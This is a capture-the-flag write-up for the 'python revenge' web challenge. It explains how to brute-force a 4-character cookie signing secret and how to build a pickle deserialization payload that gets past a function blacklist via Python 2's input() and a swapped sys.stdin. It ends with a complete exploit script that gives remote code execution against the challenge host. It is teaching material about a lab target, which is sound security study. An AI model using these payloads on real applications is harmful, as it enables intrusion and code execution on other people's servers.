# python revenge (web)

in the task we get access to a webpage which stores some data we input in a form.
we also get [source code](revenge.py) of the page.
it's using flask and python.

the important part is the way the page stores our input:

```python
location = b64e(pickle.dumps(location))
cookie = make_cookie(location, cookie_secret)
```

so the data are stored in a cookie using pickle, and as it seems they are loaded the same way:

```python
def loads(strs):
    reload(pickle)
    files = stringio(strs)
    unpkler = pickle.unpickler(files)
    unpkler.dispatch[pickle.reduce] = _hook_call(
        unpkler.dispatch[pickle.reduce])
    return unpkler.load()
```

we've written already quite a few writeups on exploiting pickle.
in short pickle deserialization can call functions.
we only need to have a callable and tuple of arguments and we can call this.
the simplest trick would be to make a pickle like:

```
cos
system
(s'ls -la'
tr.
```

where `c` means that rests of the line is module name and next line is symbol name to import, `s'some string'` places a string on the stack, `t` means pop elements from the stack up until `(` and then place a tuple of all those arguments on the stack, and `r` means pop 2 elements from the stack, and try to call the first one with second one as argument. 
dot is just end of pickle.

so this translates to: `os.system('ls -la')`

in our task we've got two issues to overcome. first there is a signature for the cookie content:

```python
def getlocation():
    cookie = request.cookies.get('location')
    if not cookie:
        return ''
    (digest, location) = cookie.split("!")
    if not safe_str_cmp(calc_digest(location, cookie_secret), digest):
        flash("hey! this is not a valid cookie! leave me alone.")
        return false
    location = loads(b64d(location))
    return location


def make_cookie(location, secret):
    return "%s!%s" % (calc_digest(location, secret), location)


def calc_digest(location, secret):
    return sha256("%s%s" % (location, secret)).hexdigest()
```

so we can't simply place any payload in the cookie, because we need to know the hash.
the secret to hash is appended at the end, so we can'y simply use hash length extension here.
however, we notice in the code:

```python
if not os.path.exists('.secret'):
    with open(".secret", "w") as f:
        secret = ''.join(random.choice(string.ascii_letters + string.digits)
                         for x in range(4))
        f.write(secret)
with open(".secret", "r") as f:
    cookie_secret = f.read().strip()
```

so the `secret` is actually only 4 bytes and only from `string.ascii_letters + string.digits` charset!
we can simply grab an some random cookie and then run:

```python
def break_cookie():
    data = 'd7e3bd07f7ae389f07abe89d199ebae1e1e67b4479a98870ee5a3c4fe0f56237!vjermqpwmaou'
    (hash, msg) = data.split("!")
    for c in itertools.product(string.ascii_letters + string.digits, repeat=4):
        if hashlib.sha256("%s%s" % (msg, "".join(c))).hexdigest() == hash:
            print("".join(c))


break_cookie()
```

this way we recover secret `hitb`

now we can send arbitrary payloads to the page, now we need to face the second issue:

```python
black_type_list = [eval, execfile, compile, open, file, os.system, os.popen, os.popen2, os.popen3, os.popen4, os.fdopen, os.tmpfile, os.fchmod, os.fchown, os.open, os.openpty, os.read, os.pipe, os.chdir, os.fchdir, os.chroot, os.chmod, os.chown, os.link, os.lchown, os.listdir, os.lstat, os.mkfifo, os.mknod, os.access, os.mkdir, os.makedirs, os.readlink, os.remove, os.removedirs, os.rename, os.renames, os.rmdir, os.tempnam, os.tmpnam, os.unlink, os.walk, os.execl, os.execle, os.execlp, os.execv, os.execve, os.dup, os.dup2, os.execvp, os.execvpe, os.fork, os.forkpty, os.kill, os.spawnl, os.spawnle, os.spawnlp, os.spawnlpe, os.spawnv, os.spawnve, os.spawnvp, os.spawnvpe, pickle.load, pickle.loads, cpickle.load, cpickle.loads, subprocess.call, subprocess.check_call, subprocess.check_output, subprocess.popen, commands.getstatusoutput, commands.getoutput, commands.getstatus, glob.glob, linecache.getline, shutil.copyfileobj, shutil.copyfile, shutil.copy, shutil.copy2, shutil.move, shutil.make_archive, dircache.listdir, dircache.opendir, io.open, popen2.popen2, popen2.popen3, popen2.popen4, timeit.timeit, timeit.repeat, sys.call_tracing, code.interact, code.compile_command, codeop.compile_command, pty.spawn, posixfile.open, posixfile.fileopen]
```

we can't use any of those in our pickle payload, so our example with `os.system` won't do.

it took a moment to notice one important thing about this task - it's python 2, and on the blacklist there is no `input()` function.
there is a huge difference between python 2 and 3 regarding this function.
in python 3 it behaves the same as `raw_input()` from python 2 - it simply reads input from stdin.
but in python 2 what it does is actually `eval(raw_input())`, so by using `input()` we can do `eval()`.

the function itself we can grab from `__builtin__` module so simple:

```
c__builtin__
input
(s'> '\ntr.
```

would invoke the function with `> ` as prompt.
now we need to actually send some data to the function, but it reads from `stdin`.
fortunately python allows to monkey-patch almost anything, so we can simply assign some object to `sys.stdin` and therefore substitute stdin for something else.
of course pickle requires the functinal form of `function, args` so we actually need to do `setattr(sys, 'stdin', something_else)`
again, we can grab `setattr` from `__builtin__`.
to get `sys` module object we need to import it.
we can't use `csys` or `isys` because both require actually importing something from this module, not module itself.
what we need is to call `__import__('sys')`, and again function `__import__` is in `__builtin__`.

so we can just do:

```
c__builtin__
setattr
(c__builtin__
__import__
(s'sys'
tr
s'stdin'
something_else
tr.
```

which will translate to `__builtin__.setattr(__builtin__.__import__('sys'),'stdin',something_else)`

now the last part is to change `stdin` into some string based source, for that we can just use `stringio` class so:

```
cstringio
stringio
(s'command'
tr.
```

so now if we combine this we get:

```
c__builtin__
setattr
(c__builtin__
__import__
(s'sys'
trs'stdin'
cstringio
stringio
(s'" + command_to_eval + "'
trtrc__builtin__
input
(s'python> '
tr.
```

which translates to:

```
newstdin = stringio.stringio(command_to_eval) # just for readability
__builtin__.setattr(__builtin__.__import__('sys'),'stdin',newstdin)
__builtin__.input('python> ')
```

and gives us power to execute python.

the final attck script is simply:

```python
def main():
    url = "http://47.75.151.118:9999"
    response = ""
    while true:
        try:
            command_to_eval = raw_input("python> ")
            payload = "c__builtin__\nsetattr\n(c__builtin__\n__import__\n(s'sys'\ntrs'stdin'\ncstringio\nstringio\n(s'" + command_to_eval + "'\ntrtrc__builtin__\ninput\n(s'> '\ntr."
            response = requests.get(url, cookies={"location": make_cookie(base64.b64encode(payload), 'hitb')})
            print(re.findall('<h3 class="wow fadeinleftbig">(.*?)</h3>', response.text, re.dotall)[0])
        except exception as e:
            print(response.text)


main()
```

we can execute for example `__import__("subprocess").check_output("ls")` to run `ls` command.
for some reason it was failing on some commands, so we just kept using python api like `__import__("os").listdir("/")`
in the root there was file `flag_is_here` and by sending `open('/flag_is_here','r').read()` we get: `hitb{py5h0n1st8ebe3tnow}`

